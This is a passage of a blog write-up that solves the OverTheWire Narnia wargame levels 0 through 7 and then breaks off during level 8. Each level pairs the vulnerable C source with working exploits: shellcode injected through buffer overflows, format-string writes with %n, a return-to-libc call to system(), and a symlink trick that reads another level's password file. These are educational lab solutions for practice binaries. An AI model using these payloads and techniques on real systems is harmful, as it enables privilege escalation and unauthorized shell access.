---
layout: post
title: "[OverTheWire] Narnia Wargame Solutions"
date: 2025-10-01
categories: [OverTheWire, Narnia]
---

# {{ page.title }}

## Narnia Wargame Brief
*"This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it. The difficulty of the game is somewhere between Leviathan and Behemoth, but some of the levels could be quite tricky."*

All challenge files are located in **/narnia/**.\
Once a challenge is solved, the password for the next challenge can be located in **/etc/narnia_pass/narnia{challenge number}**.

**OverTheWire Narnia Wargame:** [https://overthewire.org/wargames/narnia/](https://overthewire.org/wargames/narnia/)

**Difficulty:** 2/10

**Host:** narnia.labs.overthewire.org\
**Port:** 2226

---
---
## Challenge Solutions:
- [Narnia0 Solution](#narnia0-solution)
- [Narnia1 Solution](#narnia1-solution)
- [Narnia2 Solution](#narnia2-solution)
- [Narnia3 Solution](#narnia3-solution)
- [Narnia4 Solution](#narnia4-solution)
- [Narnia5 Solution](#narnia5-solution)
- [Narnia6 Solution](#narnia6-solution)
- [Narnia7 Solution](#narnia7-solution)
- [Narnia8 Solution](#narnia8-solution)

---
---
## Narnia0 Solution
**Username:** narnia0\
**Password:** narnia0

### Source Code (narnia0.c):
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

At the beginning of the **main()** function, a variable named `val` is assigned the value `0x41414141` (**AAAA**), before a character buffer of **20-bytes** is created with the name `buf`.\
The binary prints that the challenge is to change the value of `val` from **0x41414141** to **0xdeadbeef**. After that it prompts the user for input and uses `scanf()` to read 24-bytes from **stdin** and write it into the buffer `buf`.

The buffer is only 20-bytes, this leads to a **Buffer Overflow** allowing the user to overwrite the next 4-bytes on the stack with their input.

The binary also displays what the target value `val` is overwritten with after the user gives input. If `val` is overwritten with **0xdeadbeef** then `system("/bin/sh");` is called to spawn an interactive shell. If it does not, then it prints *"WAY OFF!!!!"*.

The target `val` is located directly above the input buffer `buf` on the stack, meaning it can be overwritten by the 4-byte overflow by simply writing 20-bytes and then the address **0xdeadbeef** in Little-Endian (**\xef\xbe\xad\xde**).

### Exploit:
```bash
narnia0@narnia:/narnia$ ( perl -e 'print "A"x20 . "\xef\xbe\xad\xde"'; cat; ) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef

whoami
narnia1
```

---
---
## Narnia1 Solution
**Username:** narnia1\
**Password:** [REDACTED]

### Source Code (narnia1.c):
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

The premise of this challenge is very basic, it attempts to get the value stored in the environment variable `EGG` and then return to it.

To exploit this binary, the `EGG` environment variable needs to contain code that the binary can execute, which in this case is **x86 Intel Linux shellcode**. We can use shellcode to spawn an interactive shell by calling `execve("/bin/sh", ["/bin/sh", "-p"])` (like [this shellcode](/shellcode/asm-02.html)) to maintain privileges, which is required as the binary is **SUID** and runs as the user **narnia2**.\
Using shellcode that only calls **/bin/sh** would drop privileges when the shell is spawned and only give the user a shell as **narnia1**.

### Exploit:
```bash
narnia1@narnia:/narnia$ export EGG=$(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
```

---
---
## Narnia2 Solution
**Username:** narnia2
**Password:** [REDACTED]

### Source Code (narnia2.c):
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

The binary defines a 128-byte buffer named `buf` at the beginning of the **main()** function. It takes a single argument and uses `strcpy()` to copy the value passed in the argument into the buffer. The function `strcpy()` has no bounds checking which means that if the user passes an argument to the binary that is longer than 128-bytes it will fill the buffer and then continue writing onto the stack, causing a **Buffer Overflow**.

To exploit this binary, the **Buffer Overflow** vulnerability needs to be abused to overwrite the return address with the address pointing to some shellcode that the user places on the stack. This can be done in multiple ways, one of the ways is by writing some shellcode onto the stack before the return address or after it, and overwriting the return address to point to that which is a great way of doing it when exploiting a **Buffer Overflow** remotely where you do not have access to the host already.\
In this scenario, we already have access to the machine so we are going to do it by placing the shellcode in an environment variable, locating the address where the environment variable is located on the stack, and overwriting the return address with that address.

To locate the address of an environment variable outside of **GDB**, we use this `C` binary:
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

```bash
# Write the C code into a file in /tmp
# Compile the binary
gcc -m32 -o /tmp/find_env /tmp/find_env.c
```

To overwrite the return address, we need to find the total number of bytes we need to write onto the stack before overwriting the return address. This can be done in **GDB-GEF**.

```bash
# Create a unique pattern string
> pattern create 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

# Run the binary and pass the string as an argument
──── stack ────
0xffffd250│+0x0000: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"    ← $esp
0xffffd254│+0x0004: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffd258│+0x0008: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
0xffffd25c│+0x000c: "maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabya[...]"
0xffffd260│+0x0010: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabza[...]"
0xffffd264│+0x0014: "oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacba[...]"
0xffffd268│+0x0018: "paabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaacca[...]"
0xffffd26c│+0x001c: "qaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacda[...]"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616169
──── threads ────
[!] Id 1, Name: "narnia2", stopped 0x62616169 in ?? (), reason: SIGSEGV

# The return address is overwritten with 0x62616169. Calculate the offset
> pattern offset 0x62616169
[*] Searching for '69616162'/'62616169' with period=4
[*] Found at offset 132 (little-endian search) likely
```

The offset is calculated to be 132-bytes, meaning we have to write 132-bytes onto the stack plus another 4-bytes to overwrite the return address.

Like in **narnia1**, I am going to use [shellcode](/shellcode/asm-02.html) that spawns a shell using `execve("/bin/sh", ["/bin/sh", "-p"])` to maintain privileges when the shell is spawned.

### Exploit:
```bash
narnia2@narnia:/narnia$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')

narnia2@narnia:/narnia$ /tmp/find_env SHELLCODE
SHELLCODE is at 0xffffd5b5

narnia2@narnia:/narnia$ ./narnia2 $(perl -e 'print "A"x132 . "\xb5\xd5\xff\xff"')
$ whoami
narnia3
```

---
---
## Narnia3 Solution
**Username:** narnia3\
**Password:** [REDACTED]

### Source Code (narnia3.c):
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

In this binary, at the beginning of the **main()** function two integer variables are defined `ifd` and `ofd`. These are just variables to hold file-descriptors of opened files which we do not need to worry about for this challenge. The next 3 lines define 3 character buffers. The first being `ofile` which is a 16-byte buffer holding the string **"/dev/null"**, the next is `ifile` which is a 32-byte buffer, and the final is `buf` which is a 32-byte buffer.

It gets the path of `ifile` from `argv[1]` which is the first argument passed to the binary and uses the `strcpy()` function to copy the path into the `ifile` buffer. As seen in **narnia1**, the `srtcpy()` function has no bounds checking causing a **Buffer Overflow** vulnerability.

The purpose of the binary is to take the contents of one file and write them to */dev/null*, however due to the **Buffer Overflow** we can overwrite the value in the `ofile` buffer (*/dev/null*) to whatever we want, abusing the **Buffer Overflow** into an arbitrary write exploit.

To exploit this, we need a path long enough to overflow the `ifile` buffer and overwrite */dev/null* in the `ofile` buffer. Unfortunately the path to the **narnia4** password file (*/etc/narnia_pass/narnia4*) is not long enough so we need to create our own path in **/tmp**.

### Exploit Setup:
```bash
# Create a new directory in /tmp (Path length: 32-bytes)
# This path is used to fill up the 32-byte ifile buffer
mkdir /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA

# Create two more directories in the original directory (Path length: 40-bytes)
# This is used to overflow the ofile buffer with /tmp/qwp (8-bytes)
mkdir -p /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp

# Create the directory /tmp/qwp
mkdir /tmp/qwp

# Create an empty file named narniap in /tmp/qwp (Length: 16-bytes)
touch /tmp/qwp/narniap

# Create a symlink pointing to /etc/narnia_pass/narnia4 named narniap
ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp/narniap
```

The path to the **narniap** file is 48-bytes, overflowing the `ifile` buffer and overwriting */dev/null* in the `ofile` buffer with */tmp/qwe/narniap*. However, the `ifile` variable will still point to the symlink at */tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp/narniap*.

When the binary is run and the path to the symlink is passed as the first argument, it will read the password from */etc/narnia_pass/narnia4* and write it into the empty file at */tmp/qwp/narniap*.

### Exploit:
```bash
narnia3@narnia:/narnia$ mkdir /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA
narnia3@narnia:/narnia$ mkdir -p /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp
narnia3@narnia:/narnia$ mkdir /tmp/qwp
narnia3@narnia:/narnia$ touch /tmp/qwp/narniap
narnia3@narnia:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp/narniap
narnia3@narnia:/narnia$ ./narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp/narniap
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/qwp/narniap to a safer place... (/tmp/qwp/narniap)
```

Now we can read the file */tmp/qwp/narniap* and get the password for **narnia4**.

---
---
## Narnia4 Solution
**Username:** narnia4\
**Password:** [REDACTED]

### Source Code (narnia4.c):
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

In this binary, there is another **Buffer Overflow** caused by the `strcpy()` function which copies the value passed in the first argument, when the binary is called, into the 256-byte buffer.

However, in this binary, it performs an operation which iterates through all environment variables and *nulls them out* making the method of putting shellcode in an environment variable impossible. To exploit this binary, we need to overflow the buffer and overwrite the return address with the address pointing to the shellcode that we put on the stack.

First, we need to find the offset before overwriting the return address. To do this we can use **GDB-GEF**.

```bash
# Create a unique pattern string
> pattern create 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

# Run the binary and pass the string as the first argument
──── stack ────
0xffffd190│+0x0000: "raacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadea[...]"    ← $esp
0xffffd194│+0x0004: "saactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfa[...]"
0xffffd198│+0x0008: "taacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadga[...]"
0xffffd19c│+0x000c: "uaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadha[...]"
0xffffd1a0│+0x0010: "vaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadia[...]"
0xffffd1a4│+0x0014: "waacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadja[...]"
0xffffd1a8│+0x0018: "xaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka[...]"
0xffffd1ac│+0x001c: "yaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadla[...]"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x63616171
──── threads ────
[!] Id 1, Name: "narnia4", stopped 0x63616171 in ?? (), reason: SIGSEGV

# The return address is overwritten with the value 0x63616171. Calculate the offset
> pattern offset 0x63616171
[*] Searching for '71616163'/'63616171' with period=4
[*] Found at offset 264 (little-endian search) likely
```

the offset is calculated to be 264-bytes which means we need to write 264-bytes onto the stack before overwriting the return address. Within the 264-bytes we need to include the shellcode we want to return to. I will be using [shellcode](/shellcode/asm-02.html) which spawns a shell by calling `execve("/bin/sh", ["/bin/sh", "-p"])` to maintain privileges when the shell is spawned.

### Exploit Setup:
```text
Offset = 264
Shellcode Length = 33

Payload Layout:
NOPs = 200-bytes
Shellcode = 33-bytes
Padding (Offset - Shellcode - NOPs = 31-bytes)
Return Address = 4-bytes

$(perl -e 'print "\x90"x200  . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "B"x31 . "RETURN ADDRESS"')
```

Memory addresses differ on the host machine outside of **GDB-GEF**, so to locate the address of the buffer on the stack, we can use `ltrace`.

```bash
narnia4@narnia:/narnia$ ltrace ./narnia4 $(perl -e 'print "\x90"x200  . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "B"x31 . "BBBB"')

__libc_start_main(0x804909d, 2, 0xffffd354, 0 <unfinished ...>
strlen("SHELL=/bin/bash")                                                                  = 15
memset(0xffffd5d4, '\0', 15)                                                               = 0xffffd5d4
strlen("PWD=/narnia")                                                                      = 11
memset(0xffffd5e4, '\0', 11)                                                               = 0xffffd5e4
{SNIPPED}
strcpy(0xffffd194, "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...) = 0xffffd194
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

It shows that the input passed in `argv[1]` is copied into the buffer located at **0xffffd194** on the stack. The payload used begins with 200-bytes of **NOPs**, however overwriting the return address with **0xffffd194** causes a **Segmentation Fault** possibly due to stack alignment issues, however we can point the return address to a location within the 200-bytes of **NOPs**.

### Exploit:
```bash
narnia4@narnia:/narnia$ ./narnia4 $(perl -e 'print "\x90"x200  . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "B"x31 . "\x5c\xd2\xff\xff"')
bash-5.2$ whoami
narnia5
```

---
---
## Narnia5 Solution
**Username:** narnia5\
**Password:** [REDACTED]

### Source Code (narnia5.c):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```

The premise of this challenge is to change the value of the `i` variable from **1** to **500**. If the value is successfulyl changed, then it will spawn an interactive shell, however if it is not changed to **500** then it will print the contents of the buffer which contains the input passed to the binary via `argv[1]` as well as printing the value of `i` and the location of it on the stack.

However, when printing the buffer, there is a **Format-String Vulnerability** which can be used to read values from the stack, but more importantly it can be used to *write* data on the stack, which is what we will use it for in this challenge.

When running the binary with any input passed in `argv[1]`, it prints the address of the variable `i` on the stack. We can use this address to build a format-string payload to write the value **500** in place of the original value **1**.

### Exploit Setup:
```bash
narnia5@narnia:/narnia$ ./narnia5 test
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [test] (4)
i = 1 (0xffffd3a0)

# Address of 'i' on the stack: 0xffffd3a0
```

```text
Payload: "AAAA" + "\xa0\xd3\xff\xff" + "%492x%n"
```

We start with 4 A's before adding the address of `i` in **Little-Endian**. The 4 A's plus the 4-byte address equals 8-bytes, we want to write **500**.\
**500 - 8 = 492**

We can use the format-string expression `%492x` to print another 492-bytes. Then the final expression `%n` to write the value. The way the `%n` expression works is by writing the length of the stream of bytes into the specified address.\
**AAAA (4-bytes) + 0xffffd3a0 (4-bytes) + %492x (492-bytes) = 500-bytes**

### Exploit:
```bash
narnia5@narnia:/narnia$ ./narnia5 $(perl -e 'print "AAAA" . "\xa0\xd3\xff\xff" . "%492x%n"')
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
```

---
---
## Narnia6 Solution
**Username:** narnia6\
**Password:** [REDACTED]

### Source Code (narnia6.c):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}
```

### Code Breakdown:
A function is defined using raw assembly named `get_sp()`.
```c
// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}
```
The assembly performs these actions:\
- Copies the esp (**Stack Pointer**) into eax.
- Zeroes all bytes besides the top 2 (**most-significant**) bytes in the eax.

In simpler terms it does this `esp & 0xff000000` to return the top two bytes of the stack pointer. This is used later on.

```c
char b1[8], b2[8];
int  (*fp)(char *)=(int(*)(char *))&puts, i;
```
Two character buffers are defined. One named `b1` which is 8-bytes and one named `b2` which is also 8-bytes. These two buffers' memory locations will be adjacent on the stack.\
The next line, although looking very complicated, simply defines a **function pointer** which points to the `puts()` function.

```c
if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

/* clear environ */
for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
/* clear argz    */
for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));
```
It then does a simple check to verify that at least 2 arguments have been passed when running the binary, before iterating through the environment variables and *nulling* them and iterating through any more than 2 arguments and *nulling* them aswell.

```c
strcpy(b1,argv[1]);
strcpy(b2,argv[2]);
```
Once the environment variables and any additional arguments have been zeroed, it uses the `strcpy()` function to copy `argv[1]` (the first argument) into the buffer `b1` and copy `argv[2]` (the second argument) into the buffer `b2`.\
The function `strcpy()` has no bounds checking which means if an input larger than the buffer size (8-bytes) is provided in either `argv[1]` or `argv[2]` then the input will overflow the buffer and begin to overwrite stack values, a **Buffer Overflow** vulnerability.

```c
    if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
    setreuid(geteuid(),geteuid());
fp(b1);

    exit(1);
```
Finally, it performs the same operation as the `get_sp()` function on the **function pointer**, it zeroes all bytes besides the top 2 (**most-significant**) bytes and then calls the `get_sp()` function which returns the **most-significant** bytes of the stack pointer (**esp**).\
It then compares the two values, if they match then that means that the function pointer is pointing to a location on the stack and the binary exits. This is a crude prevention mechanism to prevent us from being able to return to somewhere located on the stack, such as shellcode.

If the values do not match, then it calls `setreuid(geteuid(), geteuid())` to set the real UID and effective UID to the current effective UID (which in this case is the eUID of **narnia7** as the binary is **SUID**). This is done to help us out maintaining privileges when we exploit the binary to get a shell. After that, the function pointed to by the **function pointer** is called and passed the buffer `b1` as the argument before exiting.

```bash
narnia6@narnia:/narnia$ ./narnia6 A B
A
```
Running the binary and passing the arguments "A" and "B" causes the binary to output "A". This is because the function pointer points to the `puts()` function.

### Exploit Setup:
Opening the binary in **GDB-GEF** and running it with the arguments **"AAAAAAAAAAAA"** and **"BBBBBBBB"** causes a **Segmentation Fault** and looking at the crash dump it shows that it tries to call the function at **0x41414141** (**AAAA**). We overflowed the buffer `b1` by filling it with 8-bytes and then a further 4-bytes to overflow the function pointer.

```bash
──── stack ────
0xffffd344│+0x0000: 0x08049321  →  <main+013e> add esp, 0x4      ← $esp
0xffffd348│+0x0004: 0xffffd354  →  "AAAAAAAAAAAA"
0xffffd34c│+0x0008: "BBBB"
0xffffd350│+0x000c: 0x00000000
0xffffd354│+0x0010: "AAAAAAAAAAAA"
0xffffd358│+0x0014: "AAAAAAAA"
0xffffd35c│+0x0018: "AAAA"
0xffffd360│+0x001c: 0x00000000
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
──── threads ────
[!] Id 1, Name: "narnia6", stopped 0x41414141 in ?? (), reason: SIGSEGV
```

Running the binary again but this time with the arguments **"AAAAAAAA"** and **"BBBBBBBBCCCCCCCCDDDD"**, it attempts to return to **0x44444444** (**DDDD**). This means that we can fill the buffer `b2` with 8-bytes, then overflow the buffer and begin to fill up the buffer `b1`. This is good because when the function pointer is called, it is passed the pointer to the buffer `b1`.

We need to find somewhere to return to that is not on the stack. Such as a location within **LIBC**, like the `system()` function which takes a single argument, the command or file to run.

To locate the address of `system()` in **LIBC**, in **GDB-GEF** we run `p system` which will give us the address.

```bash
gef>  p system
$2 = {int (const char *)} 0xf7dcd430 <__libc_system>
```

The final exploit will look like so:
```text
AAAAAAAA\x30\xd4\xdc\xf7 BBBBBBBB/bin/sh
```

### Exploit:
```bash
narnia6@narnia:/narnia$ ./narnia6 $(perl -e 'print "A"x8 . "\x30\xd4\xdc\xf7"') $(perl -e 'print "B"x8 . "/bin/sh"')
$ whoami
narnia7
```

---
---
## Narnia7 Solution
**Username:** narnia7\
**Password:** [REDACTED]

### Source Code (narnia7.c):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

In this challenge, we have a binary that takes a single argument when it is run. The `main()` function calls the `vuln()` function and passes `argv[1]` (the first argument) to it.

The `vuln()` function performs multiple actions, however most notably it starts with defining a function named `ptrf` which points to another function `int (*ptrf)();`.

```c
printf("goodfunction() = %p\n", goodfunction);
printf("hackedfunction() = %p\n\n", hackedfunction);
```
It then prints the addresses of the functions `goodfunction()` and `hackedfunction()`.

```c
ptrf = goodfunction;
printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

printf("I guess you want to come to the hackedfunction...\n");
sleep(2);
ptrf = goodfunction;
```
It then points the function `ptrf` to `goodfunction()` and prints the address that `ptrf` points to, as well as the address of `ptrf` itself. Afterwards, it prints a message and sleeps for 2 seconds before again pointing `ptrf` to `goodfunction()`.

In the next lines, is uses the `snprintf()` to *format* the string passed via the pointer to `argv[1]` in the local buffer defined at the start of the function. However, because no **%** specifiers are used within `snprintf()`, it is vulnerable to a **Format String** vulnerability.

The `goodfunction()` simply prints *"Welcome to the goodfunction, but i said the Hackedfunction.."* and returns. However, the `hackedfunction()` prints *"Way to go!!!!"* and spawns an interactive shell. The aim is to call `hackedfunction()` instead of `goodfunction()`.

### Exploit Setup:
When running the binary normally it gives us the addresses of the `goodfunction()`, `hackedfunction()` and location of `ptrf`.

```bash
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd318)
```
The addresses of the *good* and *hacked* functions are similar, only the lowest 12-bits differ.

We can build a format string payload using the **%hn** specifier to write 16-bits to a specified address. However, the way that the **%n** specifier works for writing is by writing the length of the stream of bytes before the specifier.

To overwrite the last 16-bits of the address pointed to by `ptrf` we need to calculate the number of bytes to write.
```text
hackedfunction() = 0x804930f

Upper 16-bits: 0x0804
Lower 16-bits: 0x930f

0x930f = 37647 (decimal)
```

The final payload will look like so:
```bash
perl -e 'print "\x18\xd3\xff\xff" . "%37647x%hn"'
```

### Exploit:
```bash
narnia7@narnia:/narnia$ ./narnia7 $(perl -e 'print "\x18\xd3\xff\xff" . "%37647x%hn"')
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before : ptrf() = 0x80492ea (0xffffd318)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
```

---
---
## Narnia8 Solution
**Username:** narnia8\
**Password:** [REDACTED]

### Source Code (narnia8.c):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```

The binary takes a single argument and the `main()` function checks to verify that an argument has been passed before calling the function `func()` and passes it the input via `argv[1]`.

The function `void func(char *b)` takes a single argument which is defined as a pointer to `b` (**argv[1]**).

```c
char *blah=b;
char bok[20];
```
It then defines a variable `blah` which is a pointer to `b`, as well as a character buffer of 20-bytes named `bok`.

```c
memset(bok, '\0', sizeof(bok));
for(i=0; blah[i] != '\0'; i++)
        bok[i]=blah[i];
```
It *nulls* the entire `bok` buffer before iterating through `blah` for as long as the character at the index **i** is not null and copies the value at `blah[i]` into `bok[i]`.\
When a null-byte is reached, it breaks out of the loop and prints the buffer `bok`.
```c
printf("%s\n",bok);
```

### Exploit Setup:
Opening the binary in **GDB-GEF** and running it whilst passing different length strings we can see that an address decrements by 1 for every character in the input.
```bash
# Run the binary with the 8 A's
